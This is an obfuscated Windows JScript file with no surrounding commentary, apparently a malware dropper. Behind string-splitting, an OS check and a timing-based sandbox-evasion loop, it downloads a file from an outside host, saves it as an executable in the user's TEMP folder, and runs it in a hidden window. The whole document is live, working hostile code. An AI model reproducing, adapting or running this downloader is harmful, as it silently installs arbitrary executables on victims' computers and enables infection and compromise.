var U = false;
var FH = "Create"+"Object";
var MR = function PF() {return WScript[FH]("WScript"+".Shell");}(), VD = 11;
var P = "MSXML2"+".XMLHTTP";
var YJ = 2;
var C = YJ - 2;
function UC(CG0){MR["Run"](CG0, C, C);};
function OR(){return P + "";};
function E(A1, I){C = C * 1; return A1 - I;};
function Q(){return FH;};
/*@cc_on
  @if (@_win32 || @_win64)
    U = true;
  @end
@*/
if (U)
{
var N1 = "";
function N0(){return 22;};
var EZ = 0; var N2 = 0;
function N()
{
var ZA = new this["Date"]();
var K = ZA["getUTCMilliseconds"]();
WScript["Sleep"](N0());
var ZA = new this["Date"]();
var UX = ZA["getUTCMilliseconds"]();
WScript["Sleep"](N0());
var ZA = new this["Date"]();
var VG = ZA["getUTCMilliseconds"]();
var EZ = "ED";
EZ = E(UX, K);
var N2 = "A";
N2 = E(VG, UX);
N1 = "open";
return E(EZ, N2);
}
var YB = false;
var OH = false;
for (var EF = C; EF < N0() * 1; EF++){if (N() != C){
YB = true; 
N2 = "31" + 11 * EZ + N2; 
OH = true; 
break;
}}
function D() {return ((YB == true) && (YB == OH)) ? 1 : C;};
if (YB && D() && OH){
function DD() {return MR["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "MUJGMiCUdrWO4sp8.ex" + "e";};
 AJ = OR();
 JB = WScript[FH](AJ);
 var M = 1;
do { 
	for (;M;){
	try {
		if (M == 1)
		{
			JB[N1]("GET", "http://be-stlines-tore.com/u3rsap", false);
			JB["send"]();
			J = "Sleep";
			M = 2;
		}
		WScript[J](N0() + 120); 
		if (JB["readystate"] < 2 * 2) continue;
		M = C;
		function NC(MG) {var UC0 = (1, 2, 3, 4, 5, MG); return UC0;};
		A0 = WScript[Q()]("ADODB.Stream");
		AJ = A0;
		AJ[N1]();
		AJ["type"] = NC(1);
		AJ["write"](JB["ResponseBody"]);
		A0["position"] = NC(C);
		AJ["Save" + "ToFile"](DD(), 2);
		A0["cl"+"ose"]();
		CG = DD();
		UC(CG);
	} catch(B){};};
}while (M);
}
}

